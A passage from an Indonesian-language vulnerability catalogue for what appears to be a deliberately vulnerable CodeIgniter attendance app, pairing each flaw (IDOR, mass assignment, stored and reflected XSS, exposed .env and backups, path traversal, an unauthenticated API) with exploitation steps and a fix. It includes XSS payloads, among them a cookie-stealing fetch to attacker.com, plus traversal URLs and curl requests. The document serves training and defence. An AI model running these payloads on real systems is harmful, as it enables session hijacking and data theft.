**Deskripsi:**
Method `detail($mataKuliahId)` tidak memvalidasi apakah mahasiswa yang login
benar-benar mengambil mata kuliah tersebut. Mahasiswa bisa mengakses halaman
absensi MK yang tidak pernah diambilnya dengan mengganti ID di URL.

```php
public function detail($mataKuliahId) {
    $mahasiswa = $this->mahasiswaModel->findByUserId(session()->get('user_id'));
    // TIDAK ada validasi enrollment!
    $absensiList = $this->absensiModel->getAbsensiMahasiswa($mahasiswa['id'], (int) $mataKuliahId);
}
```

**Dampak:**
- Information disclosure — mahasiswa bisa melihat jadwal pertemuan MK lain
- Meskipun data absensi pribadinya kosong, informasi MK terekspos
- Bisa dikombinasikan dengan IDOR lain untuk mapping data lebih luas

**Cara Eksploitasi:**
```
1. Login sebagai mhs001
2. Buka /mahasiswa/absensi → lihat daftar MK
3. Catat mata_kuliah_id MK sendiri (misal 1)
4. Ganti URL ke /mahasiswa/absensi/2 → info MK lain terekspos
5. Coba /mahasiswa/absensi/3, /4, /5 → iterate semua MK
```

**Fix:**
```php
$cek = $this->absensiModel
            ->where('mahasiswa_id', $mahasiswa['id'])
            ->where('mata_kuliah_id', $mataKuliahId)
            ->countAllResults();
if ($cek === 0) {
    throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
}
```

---

### VULN-MASS-003: Mass Assignment di Update Absensi

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-MASS-003                                              |
| **Kategori** | Broken Access Control — OWASP A01:2021                     |
| **Lokasi**   | `app/Controllers/DosenController.php` — method `absensiStore()` |
| **Severity** | 🟠 High                                                    |

**Deskripsi:**
Saat update absensi, field `mahasiswa_id` ikut disertakan dalam data update.
Dosen bisa memodifikasi POST request untuk mengubah kepemilikan record absensi
ke mahasiswa lain, merusak integritas data kehadiran.

```php
$updateData = [
    'status'        => $s,
    'keterangan'    => $k,
    'tanggal'       => $tanggal,
    'mahasiswa_id'  => $mhsId,    // VULN: bisa diubah via POST!
    'mata_kuliah_id'=> $mataKuliahId,
    'pertemuan'     => $pertemuan,
];
$absensiModel->update($absensiIds[$i], $updateData);
```

**Dampak:**
- Integritas data absensi terkompromi
- Dosen bisa memindahkan kehadiran (hadir) dari mahasiswa A ke mahasiswa B
- Dosen bisa assign status alpha ke mahasiswa yang sebenarnya hadir
- Manipulasi data kehadiran mempengaruhi eligibilitas ujian

**Cara Eksploitasi:**
```
# Intercept POST request saat update absensi, ubah mahasiswa_id:
curl -X POST http://localhost:8080/dosen/absensi/store/1 \
  -b "ci_session=<dosen_session>" \
  -d "pertemuan=1&tanggal=2025-09-01&mahasiswa_id[0]=5&status[0]=hadir&absensi_id[0]=1"
# Record absensi ID 1 (milik mahasiswa 1) sekarang menjadi milik mahasiswa 5
```

**Fix:**
```php
// Whitelist hanya field yang boleh diupdate:
$absensiModel->update($absensiIds[$i], [
    'status'     => $s,
    'keterangan' => $k,
    'tanggal'    => $tanggal,
]);
// JANGAN sertakan mahasiswa_id dan mata_kuliah_id dalam update
```

---

### VULN-XSS-001: Stored XSS di Komentar Pengumuman

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-XSS-001                                               |
| **Kategori** | Injection (Cross-Site Scripting) — OWASP A03:2021          |
| **Lokasi**   | `app/Views/pengumuman/detail.php`                          |
| **Severity** | 🔴 Critical                                                |

**Deskripsi:**
Komentar pengumuman yang diinput oleh user disimpan langsung ke database tanpa
sanitasi, lalu ditampilkan di halaman `detail.php` tanpa *output encoding* HTML.
Attacker dapat menginjeksi tag `<script>` atau *event handler* HTML berbahaya
yang akan dieksekusi secara permanen setiap kali user (termasuk Admin) membuka
halaman detail pengumuman tersebut.

```php
<!-- Rentan karena menggunakan <?= ?> (raw output) -->
<div class="text-dark" style="font-size:.9rem; white-space: pre-wrap;">
    <?= $k['isi_komentar'] ?>
</div>
```

**Dampak:**
- *Cookie Stealing* / *Session Hijacking* (jika cookie tidak menggunakan flag HttpOnly).
- Eksploitasi akun Admin (jika Admin membuka pengumuman).
- Defacement tampilan pengumuman.
- Redirect otomatis pengguna ke halaman *phishing*.

**Cara Eksploitasi:**
```
1. Login sebagai user biasa (misal: mhs001)
2. Buka halaman detail pengumuman
3. Isi komentar dengan payload berikut:
   <script>alert('XSS Terpicu!')</script>

   # Payload untuk curi cookie:
   <script>fetch('http://attacker.com/log?c='+document.cookie)</script>

   # Payload tanpa tag <script>:
   <img src=x onerror="alert('XSS by '+document.cookie)">
4. Tekan "Kirim"
5. Reload halaman atau biarkan user lain membuka pengumuman.
6. Payload XSS akan langsung tereksekusi.
```

**Fix:**
```php
<!-- Selalu gunakan esc() untuk output ke HTML context -->
<div class="text-dark" style="font-size:.9rem; white-space: pre-wrap;">
    <?= esc($k['isi_komentar']) ?>
</div>
```

---

### VULN-XSS-002: Reflected XSS di Search Pengumuman

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-XSS-002                                               |
| **Kategori** | Injection (Cross-Site Scripting) — OWASP A03:2021          |
| **Lokasi**   | `app/Views/pengumuman/index.php`                           |
| **Severity** | 🟠 High                                                    |

**Deskripsi:**
Input parameter `q` dari pencarian pengumuman dipantulkan (*reflected*) kembali
ke halaman (di dalam elemen notifikasi pencarian) tanpa disanitasi.

```php
// Di PengumumanController::index()
$q = $this->request->getGet('q'); // Input masuk
...
// Di pengumuman/index.php
Hasil pencarian untuk: "<b><?= $q ?></b>" // Dipantulkan tanpa filter
```

**Dampak:**
- Eksekusi *client-side script* ketika korban mengklik tautan/URL berbahaya.
- Sering dikombinasikan dengan serangan *Social Engineering* via email phishing.

**Cara Eksploitasi:**
```
1. Siapkan URL berbahaya dengan payload XSS di parameter `q`.
   http://localhost:8080/pengumuman?q=<script>alert('Reflected+XSS')</script>
2. Kirim URL ini kepada korban (misal: Dosen/Admin).
3. Saat korban membuka URL, script akan tereksekusi di browser mereka.
```

**Fix:**
```php
<!-- Selalu gunakan esc() untuk parameter GET/POST -->
Hasil pencarian untuk: "<b><?= esc($q) ?></b>"
```

---

### VULN-INFO-001: Information Disclosure via robots.txt

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-INFO-001                                              |
| **Kategori** | Security Misconfiguration — OWASP A05:2021                 |
| **Lokasi**   | `public/robots.txt`                                        |
| **Severity** | 🟡 Medium                                                  |

**Deskripsi:**
File `robots.txt` sengaja membocorkan struktur direktori tersembunyi yang 
mengandung file sensitif atau antarmuka admin. Ini merupakan target recon standar.

**Dampak:**
- Attacker memperoleh peta (map) langsung menuju area tersembunyi tanpa harus *bruteforce*.

**Cara Eksploitasi:**
Buka `http://localhost:8080/robots.txt`.

**Fix:**
Jangan gunakan `robots.txt` untuk menyembunyikan folder admin, gunakan file permission/auth.

---

### VULN-INFO-002: Sensitive Files Exposed

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-INFO-002                                              |
| **Kategori** | Security Misconfiguration — OWASP A05:2021                 |
| **Lokasi**   | Direktori `public/` (`info.php`, `.env`, `backup/`)        |
| **Severity** | 🟠 High                                                    |

**Deskripsi:**
Beberapa file yang sengaja ditinggalkan developer terekspos ke publik.
Termasuk `info.php`, konfigurasi git `.git/config`, dan file SQL di `public/backup/`.

**Dampak:**
- `info.php`: Bocornya informasi OS, versi PHP, konfigurasi modul.
- `.env`: Bocornya secret key, password database.
- `backup/*.sql`: Bocornya data user.

**Cara Eksploitasi:**
Akses URL secara langsung (atau temukan menggunakan alat seperti gobuster).
`http://localhost:8080/info.php`
`http://localhost:8080/backup/db_dummy.sql`
`http://localhost:8080/.env`

**Fix:**
Hapus file *testing* di production, blokir akses ke `.*` (seperti `.env`, `.git`) 
di level web server (Apache/Nginx).

---

### VULN-IDOR-007: Path Traversal di Log Viewer

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-IDOR-007                                              |
| **Kategori** | Broken Access Control — OWASP A01:2021                     |
| **Lokasi**   | `app/Controllers/Admin/Logs.php`                           |
| **Severity** | 🔴 Critical                                                |

**Deskripsi:**
Endpoint viewer log mengambil parameter GET `file` lalu membaca isinya dengan
`file_get_contents()` tanpa melakukan validasi untuk mencegah input absolut path
atau traversal path (`../`).

**Dampak:**
- Attacker (Admin yang terkompromi) dapat membaca file di luar direktori `/logs/`.
- Membaca source code PHP aplikasi.
- Membaca file konfigurasi sensitif atau file OS.

**Cara Eksploitasi:**
Akses dengan parameter file (ubah `../../` sesuai seberapa dalam struktur):
`http://localhost:8080/admin/logs?file=../../../../../../../../Windows/win.ini`
`http://localhost:8080/admin/logs?file=../Config/Database.php`

**Fix:**
Gunakan `basename()` pada parameter `$file` agar tidak bisa *traverse* ke direktori atas.

---

### VULN-AUTH-006: Endpoint API Tanpa Authentication

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-AUTH-006                                              |
| **Kategori** | Broken Access Control — OWASP A01:2021                     |
| **Lokasi**   | `app/Controllers/Api/Users.php`                            |
| **Severity** | 🔴 Critical                                                |

**Deskripsi:**
Terdapat endpoint API yang sengaja "lupa" dilindungi *middleware/filter* 
autentikasi (JWT/Session). Lebih parah lagi, responnya mengembalikan hash 
password semua user.

**Dampak:**
- Pencurian seluruh daftar username dan hash password.
- Attacker dapat melakukan *cracking offline* pada hash tersebut.

**Cara Eksploitasi:**
`curl http://localhost:8080/api/users`

**Fix:**
Implementasikan token autentikasi pada rute API dan JANGAN PERNAH me-return 
field password/hash.

---

<!--
Template untuk menambahkan kerentanan baru:

### VULN-XXX: [Nama Kerentanan]

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-XXX                                                   |
| **Kategori** | [OWASP Category]                                           |
| **Lokasi**   | `app/Controllers/NamaController.php` — method `xxx()`      |
| **Severity** | 🔴 Critical / 🟠 High / 🟡 Medium / 🟢 Low               |

**Deskripsi:**
[Penjelasan teknis]

**Dampak:**
[Dampak keamanan]

**Cara Eksploitasi:**
```
[Langkah dan payload]
```

**Fix:**
```php
// Kode perbaikan
```

---
-->
